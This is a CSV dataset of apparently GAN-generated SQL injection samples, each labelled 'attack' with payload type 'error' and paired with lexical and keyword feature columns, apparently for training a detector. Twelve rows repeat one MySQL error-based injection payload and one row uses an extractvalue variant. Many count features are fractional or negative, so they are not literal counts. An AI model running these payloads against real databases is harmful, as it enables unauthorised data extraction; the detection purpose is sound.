id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000451,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.788790071853595,290.7705078125,89.45240020751953,41.631065368652344,110.6946029663086,5.6152119636535645,88.06924438476562,41.24400329589844,1.0274139642715454,0.3065718114376068,0.14562979340553284,0.39109325408935547,0.1323031783103943,3.833681583404541,1.6602821350097656,0.5514890551567078,0.5646751523017883,0.0745825469493866,-0.05456096678972244,-0.16352802515029907,9.759593963623047,11.549814224243164,2.917402505874634,0.17620137333869934,1.9525028467178345,0.09284745901823044,-0.054544560611248016,0.4329286217689514,0.10603861510753632,0.7008174657821655,0.15909039974212646,0.11996548622846603,1.6021130084991455,-0.012087607756257057,0.409817636013031,2.0670790672302246,8.89952564239502,1.0473639965057373,2.0080409049987793,0.42933350801467896,0.23734834790229797,0.9823388457298279,0.04345090314745903,0.0235871821641922,-0.18634405732154846,0.1932196170091629,0.0385100394487381,0.4353071451187134,0.4651912748813629,0.4560661017894745,0.4188961088657379,0.5611615777015686,0.02462545782327652,-0.03459230065345764,0.46587780117988586,0.15188352763652802,0.1992219090461731,0.009580574929714203,-0.07847636938095093,0.09750833362340927,-0.05139409378170967,-0.04674356430768967,0.14217238128185272,-0.013031162321567535,0.2275288999080658,-0.11818920075893402,0.5788456797599792,-0.19821852445602417,-0.128127783536911,-0.053156763315200806,0.09594924747943878,0.006509281694889069,-0.07576753199100494,0.08497094362974167,-0.10107819736003876,0.02743261307477951,1.0409575700759888,0.47675764560699463,0.13059335947036743,0.0875384509563446,0.4878457486629486,10.120237350463867,0.7074472904205322,0.16103149950504303,0.035037022083997726,0.6685705780982971,0.010010428726673126,-0.02381003648042679,0.03427787125110626
GAN_000452,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.881239505970405,285.267578125,88.46044921875,41.151981353759766,109.73946380615234,4.909408092498779,85.77320861816406,40.39373016357422,0.8902180194854736,0.31744521856307983,0.14733800292015076,0.39022502303123474,0.13230712711811066,3.837467908859253,1.534011960029602,0.5152443051338196,0.5209910273551941,0.13596086204051971,0.02848360687494278,0.06921763718128204,9.706327438354492,11.379744529724121,3.1052069664001465,0.19876331090927124,1.8839576244354248,0.13455137610435486,-0.04093673825263977,0.5375043153762817,0.20243044197559357,0.7100325226783752,0.21971294283866882,-0.07596784830093384,1.604332447052002,-0.11172054708003998,0.3654634952545166,2.1688625812530518,8.9463472366333,1.0967098474502563,1.9969781637191772,0.33460190892219543,0.23125703632831573,0.9761161804199219,0.03370295837521553,0.03465266525745392,-0.10810117423534393,0.030055567622184753,0.12004192173480988,0.5357123613357544,0.46343034505844116,0.48669910430908203,0.5312750935554504,0.51481032371521,0.06999164819717407,0.030604258179664612,0.4594341814517975,0.1733662337064743,0.1872512847185135,0.07754699885845184,-0.20982956886291504,0.11227245628833771,-0.03832170367240906,-0.1782621443271637,0.03461146354675293,0.13348320126533508,0.2259577512741089,-0.08662097901105881,0.5259663462638855,-0.07751631736755371,-0.059506580233573914,0.034978121519088745,0.14294880628585815,-0.06921148300170898,-0.13760623335838318,-0.04903919994831085,-0.004849247634410858,0.01793837919831276,1.0619895458221436,0.46283748745918274,0.17699074745178223,0.14140585064888,0.49890202283859253,10.156749725341797,0.6896217465400696,0.16937077045440674,0.04353059455752373,0.6912885904312134,-0.008265255019068718,-0.13701020181179047,-0.06561252474784851
GAN_000453,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.873204365143024,285.5715026855469,87.9551010131836,42.38972854614258,111.63572692871094,-0.04962936416268349,86.70918273925781,41.27189254760742,0.7808712124824524,0.311907559633255,0.1490655541419983,0.38931238651275635,0.1317405253648758,3.8535003662109375,1.8005013465881348,0.6154728531837463,0.5917845964431763,0.10341028869152069,0.18617206811904907,0.013883180916309357,10.325243949890137,11.582491874694824,3.260388135910034,0.11384038627147675,1.8531023263931274,0.15059903264045715,0.03094358555972576,0.4358809292316437,0.25440236926078796,0.8046379685401917,0.2220584601163864,-0.18189239501953125,1.5734444856643677,-0.0765845999121666,0.3414393365383148,2.1848771572113037,8.801599502563477,1.1895846128463745,2.0509936809539795,0.29423990845680237,0.2846076488494873,0.9149997234344482,0.0283898264169693,0.026472631841897964,-0.08021407574415207,0.0839725211262703,0.215703547000885,0.5237313508987427,0.5024535655975342,0.5824660062789917,0.47634157538414,0.5715830326080322,0.17541706562042236,-0.028590012341737747,0.4100031852722168,0.19054123759269714,0.23641042411327362,0.11161302030086517,-0.24020688235759735,0.24351230263710022,0.04743208736181259,-0.09160108119249344,0.11347826570272446,0.04875136911869049,0.13939547538757324,-0.02309112250804901,0.48551109433174133,-0.07013904303312302,-0.16778682172298431,0.05737730488181114,0.005997147411108017,-0.0935697928071022,-0.05136321112513542,-0.1301930993795395,-0.054469190537929535,-0.07450346648693085,1.142376184463501,0.4467662572860718,0.0762612521648407,0.11625603586435318,0.45056191086769104,10.018477439880371,0.7403870820999146,0.15576030313968658,0.03988923877477646,0.6981694102287292,0.07304239273071289,-0.07402732223272324,0.10691051185131073
GAN_000454,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.910417828808844,285.73248291015625,88.80610656738281,42.1014404296875,115.32268524169922,3.852663278579712,86.7940902709961,39.31714630126953,0.8679031729698181,0.3313957452774048,0.1428394615650177,0.39309191703796387,0.13174520432949066,3.847386598587036,1.6036183834075928,0.599120557308197,0.5934422612190247,0.07766899466514587,0.07538595795631409,0.0728321447968483,10.006950378417969,11.435215950012207,3.507193088531494,0.2833181619644165,1.9105550050735474,0.1110985204577446,0.009559744037687778,0.44423893094062805,0.15143409371376038,0.7063095569610596,0.17375195026397705,-0.06105965003371239,1.532509446144104,-0.1913609355688095,0.36734122037887573,2.1122312545776367,8.979397773742676,1.1666489839553833,2.0986475944519043,0.41638991236686707,0.24275091290473938,0.9326649308204651,-0.03222590684890747,0.03464575856924057,-0.10478771477937698,0.02948286384344101,-0.01240820437669754,0.5142425298690796,0.4811992645263672,0.5192611813545227,0.5219041109085083,0.5491262078285217,0.0269211083650589,-0.030378468334674835,0.4607480764389038,0.14485377073287964,0.19089841842651367,0.013123951852321625,-0.1412726491689682,0.1476905345916748,0.025702916085720062,-0.025634314864873886,0.03344421833753586,-0.009512476623058319,0.11563211679458618,0.03288513049483299,0.4416392743587494,-0.03934264928102493,-0.10991821438074112,0.10746335238218307,0.06294110417366028,-0.006795292720198631,-0.09997449815273285,-0.08860726654529572,0.03932775557041168,-0.0885249525308609,1.0094891786575317,0.4945221245288849,0.2903159260749817,0.10899046063423157,0.40440842509269714,9.98695182800293,0.7159938216209412,0.16309474408626556,0.030373137444257736,0.6761372685432434,-0.0361136868596077,-0.04458028823137283,0.016055792570114136
GAN_000455,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.879944869477272,289.70745849609375,90.0184326171875,39.056480407714844,111.6781997680664,7.319280624389648,90.8954849243164,41.00886917114258,0.877852737903595,0.30989792943000793,0.1495489776134491,0.3899352550506592,0.13099202513694763,3.858398914337158,1.527907133102417,0.5346357822418213,0.4376254677772522,0.044529300183057785,-0.03575390949845314,-0.17545989155769348,9.832351684570312,11.468523979187012,2.7115402221679688,0.2171020358800888,1.9128973484039307,0.09907065331935883,-0.06883262097835541,0.4055619239807129,0.13075143098831177,0.6190012693405151,0.2686324417591095,0.03401676565408707,1.5807385444641113,-0.13216446340084076,0.3786811828613281,2.0089831352233887,8.758382797241211,1.0936626195907593,2.022340774536133,0.4213954210281372,0.24424609541893005,0.9647759795188904,-0.06518856436014175,0.03415954113006592,-0.13170863687992096,0.10549724847078323,0.12738288938999176,0.44775956869125366,0.44972944259643555,0.5343911647796631,0.47930651903152466,0.5636289119720459,0.10835029184818268,-0.013455472886562347,0.48190736770629883,0.1420881152153015,0.15252630412578583,-0.06776575744152069,0.018124841153621674,0.2340153157711029,-0.08731716871261597,0.03781384974718094,0.22864925861358643,-0.06826099753379822,0.22864480316638947,-0.05211491137742996,0.5046933889389038,0.05849110335111618,-0.13956867158412933,-0.03891156613826752,0.04153767228126526,0.07546109706163406,-0.025645416229963303,-0.12712281942367554,-0.10396310687065125,-0.10875338315963745,0.9838106036186218,0.5289360880851746,0.1874949336051941,0.08038083463907242,0.528205931186676,9.845953941345215,0.7893547415733337,0.16288788616657257,0.05152636021375656,0.7022662162780762,0.07487811148166656,-0.0361931249499321,0.09326782822608948
GAN_000456,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.821051804593614,288.85357666015625,91.19031524658203,40.874534606933594,109.46898651123047,4.608561038970947,85.33211517333984,42.00483703613281,1.2222129106521606,0.3051603138446808,0.1461222767829895,0.3874642252922058,0.13176320493221283,3.820251941680908,1.7167640924453735,0.5086049437522888,0.5832446813583374,0.07544922083616257,-0.12585321068763733,-0.29899922013282776,10.248924255371094,11.077652931213379,2.907022714614868,0.11322364956140518,1.9845283031463623,0.06396088749170303,-0.004888157360255718,0.47197702527046204,0.051363956183195114,0.6969977021217346,0.2556499242782593,0.13483253121376038,1.5169309377670288,0.014509790576994419,0.41947391629219055,2.102416515350342,8.688708305358887,0.8237249851226807,1.9998395442962646,0.5212413668632507,0.27177226543426514,0.9866906404495239,0.06774214655160904,0.009314353577792645,-0.13044507801532745,0.2356778085231781,-0.03525395691394806,0.35403305292129517,0.4157223701477051,0.48438432812690735,0.31626760959625244,0.6256038546562195,0.044268231838941574,-0.014875747263431549,0.5082480907440186,0.1336384117603302,0.1969730705022812,-0.09061139076948166,-0.05698230117559433,0.20173954963684082,-0.053735993802547455,0.07858484983444214,0.2672581970691681,-0.02257203683257103,0.27240243554115295,0.08832548558712006,0.6354377865791321,-0.17468975484371185,-0.2629309892654419,-0.12694062292575836,0.1115293875336647,0.0036137979477643967,-0.06874316930770874,-0.003886803984642029,-0.14132381975650787,0.09477967023849487,0.950032651424408,0.5130838751792908,0.11910697817802429,0.060696981847286224,0.49491769075393677,10.164936065673828,0.7302657961845398,0.1652478277683258,0.04887404665350914,0.70189368724823,-0.07483860850334167,0.08270122110843658,-0.07239167392253876
GAN_000457,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.897269052467842,287.7433166503906,88.61654663085938,42.63081741333008,115.88580322265625,5.070770263671875,86.78330993652344,39.85770797729492,0.8708265423774719,0.32081860303878784,0.14166398346424103,0.3899436891078949,0.13084690272808075,3.8440256118774414,1.6876903772354126,0.5845251083374023,0.6721581220626831,0.07113180309534073,0.09240232408046722,-0.08105316013097763,10.0755615234375,11.278289794921875,3.325730800628662,0.18384990096092224,1.9450509548187256,0.12142713367938995,0.053515348583459854,0.45234546065330505,0.20368307828903198,0.7980486154556274,0.1765749752521515,-0.10600227117538452,1.5804834365844727,-0.07402484118938446,0.3686443269252777,2.1709835529327393,8.889161109924316,1.1468746662139893,2.0951170921325684,0.2661410868167877,0.3377537727355957,0.9280455708503723,0.03978918865323067,0.03775022178888321,-0.14038406312465668,0.12479624897241592,0.05147317051887512,0.46247145533561707,0.5182061195373535,0.5299466252326965,0.4998655915260315,0.5973933339118958,0.05121508240699768,-0.057379379868507385,0.447441428899765,0.1948395073413849,0.22111381590366364,0.03709590062499046,-0.21265608072280884,0.21237871050834656,-0.00044174492359161377,0.08752575516700745,0.11039375513792038,-0.024028321728110313,0.1207914799451828,0.0224841870367527,0.5085992813110352,-0.061581872403621674,-0.132686048746109,0.07422074675559998,-0.004862785339355469,-0.04275684058666229,-0.022545207291841507,-0.09966690838336945,-0.14067913591861725,-0.038567837327718735,0.9901506304740906,0.45153746008872986,0.25849342346191406,0.09263800084590912,0.3890763521194458,10.109411239624023,0.6997008323669434,0.15483243763446808,0.033672429621219635,0.6868927478790283,-0.011535301804542542,0.01883363351225853,0.1249474585056305
GAN_000458,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.80354598397552,290.50555419921875,88.97105407714844,41.63142395019531,109.63626098632812,4.612832546234131,85.40406036376953,42.45203399658203,1.0425032377243042,0.31263819336891174,0.14786913990974426,0.3895110785961151,0.1373964101076126,3.8347363471984863,1.8808553218841553,0.4810512959957123,0.5577039122581482,0.1203298419713974,-0.05165237933397293,-0.02271343395113945,10.037659645080566,10.83647632598877,3.249598741531372,0.11338236182928085,2.00976824760437,0.10907022655010223,-0.03831978514790535,0.4975705146789551,0.08416571468114853,0.8495982885360718,0.15011991560459137,-0.14416614174842834,1.606787919998169,-0.016827816143631935,0.323844850063324,2.1781604290008545,8.66602897644043,0.8639973998069763,2.199651002883911,0.38378649950027466,0.29189807176589966,0.921444296836853,0.16554954648017883,0.02841060981154442,-0.025961749255657196,0.296281099319458,0.013591296970844269,0.48220381140708923,0.37496528029441833,0.5045838952064514,0.4688078761100769,0.6866028904914856,0.09197975695133209,-0.0683271512389183,0.507462739944458,0.14699867367744446,0.18465889990329742,-0.05184697359800339,-0.14181914925575256,0.09180257469415665,-0.016296260058879852,0.012789063155651093,0.07496565580368042,0.11921059340238571,0.10215171426534653,0.0082656629383564,0.5164258480072021,-0.015071794390678406,-0.10405150055885315,0.006475731730461121,0.050760217010974884,0.004444409161806107,-0.06244279816746712,0.026954874396324158,-0.03179203346371651,0.08487483859062195,0.9403698444366455,0.4163183569908142,0.1254674792289734,0.07938980311155319,0.5315481424331665,10.497845649719238,0.7248953580856323,0.16641074419021606,0.03404061868786812,0.7001500129699707,-0.11845006048679352,0.15666796267032623,-0.003929071128368378
GAN_000459,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.7243693375261335,286.2681884765625,91.0687255859375,41.2017936706543,111.3095703125,3.3327810764312744,85.79888916015625,41.20317077636719,1.0038011074066162,0.3133499324321747,0.14531320333480835,0.3893566429615021,0.1345866322517395,3.8781378269195557,1.9935163259506226,0.7036513090133667,0.5021625757217407,0.039036426693201065,0.05420011654496193,0.047968268394470215,10.092537879943848,11.281282424926758,3.5050323009490967,0.006268329918384552,1.939292073249817,0.08456360548734665,-0.0208590030670166,0.42969661951065063,0.06605078279972076,0.8779872059822083,0.11571085453033447,-0.018450923264026642,1.553073525428772,-0.019402125850319862,0.37808310985565186,2.0685038566589355,8.792388916015625,0.8842908143997192,2.0518226623535156,0.3035963475704193,0.2698911726474762,1.0098587274551392,0.024538256227970123,0.021144311875104904,-0.16494446992874146,0.3031795024871826,0.0586642324924469,0.5178859829902649,0.455691933631897,0.5324078798294067,0.4567669630050659,0.6611580848693848,0.08689796179533005,-0.04460537061095238,0.5049108266830444,0.17118246853351593,0.17835485935211182,-0.11154508590698242,-0.017879076302051544,0.17457786202430725,-0.03280831128358841,0.13383376598358154,0.06860953569412231,0.06343791633844376,-0.060730621218681335,-0.13146264851093292,0.4489402770996094,-0.03415476530790329,-0.012250985950231552,0.0793372243642807,0.016651112586259842,0.0727558583021164,0.06770480424165726,0.1767440140247345,-0.034639522433280945,-0.1329457014799118,1.0235610008239746,0.41606080532073975,0.07820010185241699,0.023026827722787857,0.49915963411331177,10.193426132202148,0.7647199630737305,0.1684630662202835,0.03045457787811756,0.6994636058807373,0.05890471115708351,0.25020164251327515,0.0830056369304657
GAN_000460,attack,error,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000015,5.958667518238248,288.0726318359375,88.50627899169922,42.89090347290039,110.09516143798828,7.032070636749268,83.89900207519531,39.49420928955078,1.0484087467193604,0.31866616010665894,0.14329583942890167,0.39537513256073,0.1328674554824829,3.812762498855591,1.5515074729919434,0.5894492864608765,0.6830000877380371,0.13304032385349274,0.05876113101840019,-0.16382518410682678,9.76226806640625,11.224899291992188,3.0024149417877197,0.25686511397361755,1.9910156726837158,0.1321861892938614,0.0377923920750618,0.5743334889411926,0.1976354569196701,0.7590567469596863,0.16370177268981934,0.016809098422527313,1.5433039665222168,-0.05191299319267273,0.34380343556404114,2.2247819900512695,8.83462905883789,1.084071397781372,2.0869789123535156,0.32976189255714417,0.2674097716808319,0.8770335912704468,0.093577541410923,0.030475014820694923,-0.19074520468711853,0.0931275486946106,-0.08254203200340271,0.5393093824386597,0.4825018644332886,0.44335871934890747,0.5145008563995361,0.5402358174324036,-0.10757870972156525,0.13520559668540955,0.5116989016532898,0.17019382119178772,0.20087730884552002,0.058301959186792374,-0.23045554757118225,0.0021960437297821045,0.047301433980464935,-0.10301902890205383,7.624179124832153e-05,0.056418441236019135,0.276527464389801,-0.12277877330780029,0.5850890874862671,-0.24758166074752808,-0.026821870356798172,0.057508811354637146,0.1928636133670807,-0.10349419713020325,-0.10198141634464264,-0.03617364168167114,0.07213965058326721,0.1256493628025055,0.995553195476532,0.48343661427497864,0.2376192808151245,0.1059083566069603,0.45608794689178467,10.058547019958496,0.6425694227218628,0.15299564599990845,0.04323764517903328,0.6611167788505554,-0.08182267844676971,-0.15454144775867462,-0.050013940781354904
GAN_000461,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.957579581298408,291.4718322753906,89.80635833740234,40.37470245361328,107.96634674072266,2.144659996032715,87.8960189819336,41.586788177490234,0.9903082847595215,0.2990550994873047,0.1481553465127945,0.3940950930118561,0.13193297386169434,3.8267405033111572,1.7233822345733643,0.8693127632141113,0.5387461185455322,0.09154335409402847,0.002731875516474247,-0.30042701959609985,9.934889793395996,11.319479942321777,2.4304842948913574,0.08232447504997253,2.0022614002227783,0.07139129936695099,0.012478684075176716,0.40731093287467957,0.1839689165353775,0.7096874713897705,0.3529004454612732,0.06846795231103897,1.4541399478912354,-0.08750014752149582,0.368021696805954,2.0699336528778076,8.793464660644531,0.9629096388816833,2.072108507156372,0.42568784952163696,0.19960159063339233,0.8722273111343384,-0.13465982675552368,0.056417565792798996,-0.10778672248125076,0.10901156067848206,0.1536584198474884,0.453592985868454,0.3808537721633911,0.5024582147598267,0.45189368724823,0.6527737975120544,0.1216350570321083,0.10630475729703903,0.4259810447692871,0.17588858306407928,0.16999471187591553,0.125355526804924,-0.08166947215795517,0.12495376169681549,0.04822089523077011,0.058535248041152954,0.13133056461811066,0.014486268162727356,0.2969267666339874,-0.09333941340446472,0.6693960428237915,0.02232974022626877,-0.29166489839553833,-0.0219133123755455,0.09955048561096191,0.022103888913989067,-0.037387195974588394,0.045784495770931244,-0.011593914590775967,0.06057611480355263,0.9969961047172546,0.4650638997554779,0.15805774927139282,0.07784940302371979,0.5492751002311707,9.89495849609375,0.7438491582870483,0.14530262351036072,0.03525051847100258,0.7452067136764526,0.1495135873556137,0.02720172330737114,-0.1359620988368988
GAN_000462,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.692837673873708,287.4947814941406,91.28045654296875,41.98899841308594,110.52507781982422,3.301516532897949,82.69269561767578,40.2086296081543,1.0441616773605347,0.31152185797691345,0.14699022471904755,0.39425262808799744,0.13410192728042603,3.8428306579589844,1.7886112928390503,0.670356035232544,0.5699376463890076,0.09079797565937042,0.10713711380958557,-0.05080026015639305,9.987903594970703,11.498868942260742,3.3402719497680664,0.07928437739610672,1.906362533569336,0.09261193871498108,0.054195795208215714,0.41578781604766846,0.1196051612496376,0.8225836157798767,0.18074315786361694,0.025662772357463837,1.4447351694107056,-0.04460518807172775,0.38962656259536743,2.105272054672241,9.022518157958984,0.9868929982185364,2.120648145675659,0.3466716408729553,0.22869962453842163,0.9804049730300903,-0.04390297085046768,0.011625907383859158,-0.16485822200775146,0.10121937841176987,-0.012419447302818298,0.4807150363922119,0.4234292805194855,0.46709439158439636,0.3881448209285736,0.6003137230873108,0.07324272394180298,0.09790412336587906,0.486981064081192,0.15424886345863342,0.2273128181695938,0.0113956518471241,-0.02882855385541916,0.12416887283325195,0.024357177317142487,-0.10135750472545624,0.050843581557273865,0.0042626820504665375,0.11500495672225952,-0.08291765302419662,0.5572787523269653,-0.05400281399488449,-0.18154782056808472,0.06520771980285645,0.08860000967979431,-0.016320453956723213,-0.1122419685125351,0.07553303241729736,0.03891086205840111,-0.016999084502458572,1.118849754333496,0.5034448504447937,0.07470135390758514,0.041826032102108,0.5051445960998535,10.201725006103516,0.7610839605331421,0.16593171656131744,0.03894029185175896,0.6903129816055298,0.07792787253856659,0.10056139528751373,-0.07007409632205963
GAN_000463,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.786824747253341,282.1617736816406,91.514892578125,42.40668869018555,112.5859603881836,0.3616732060909271,84.7200698852539,40.91145706176758,0.9072229266166687,0.3216392397880554,0.14550940692424774,0.3916654884815216,0.1316159963607788,3.8703675270080566,1.8007926940917969,0.5708514451980591,0.6566806435585022,0.04732980206608772,0.1517011672258377,0.08358794450759888,10.548492431640625,11.346048355102539,3.4974145889282227,0.18921004235744476,1.845963716506958,0.10210396349430084,0.05725937336683273,0.42600372433662415,0.11791548877954483,0.7029776573181152,0.130703866481781,-0.0824240893125534,1.624586582183838,-0.10227115452289581,0.4266471564769745,1.9961328506469727,8.848000526428223,1.1643298864364624,2.3255622386932373,0.3878752589225769,0.2740333676338196,0.9029157757759094,-0.011847883462905884,0.022944023832678795,-0.1601978838443756,0.011057086288928986,0.06357519328594208,0.4838823080062866,0.5690010786056519,0.5080259442329407,0.4328494369983673,0.5319849252700806,0.1360664665699005,-0.18168166279792786,0.375089555978775,0.13478894531726837,0.26522096991539,-0.040705569088459015,-0.3194165825843811,0.18135538697242737,-0.05560331791639328,-0.06055205687880516,-0.012925304472446442,-0.008090067654848099,0.15873540937900543,0.02157917246222496,0.4755620062351227,-0.14545097947120667,-0.16025538742542267,0.0801636129617691,0.12502148747444153,-0.12612469494342804,-0.04724233224987984,-0.11848112940788269,-0.08180196583271027,-0.16174127161502838,1.0495975017547607,0.4418334662914276,0.20937925577163696,0.13020458817481995,0.42630451917648315,9.757872581481934,0.7598594427108765,0.13701306283473969,0.03781196475028992,0.8059290051460266,0.14633019268512726,-0.10658887028694153,0.005947418510913849
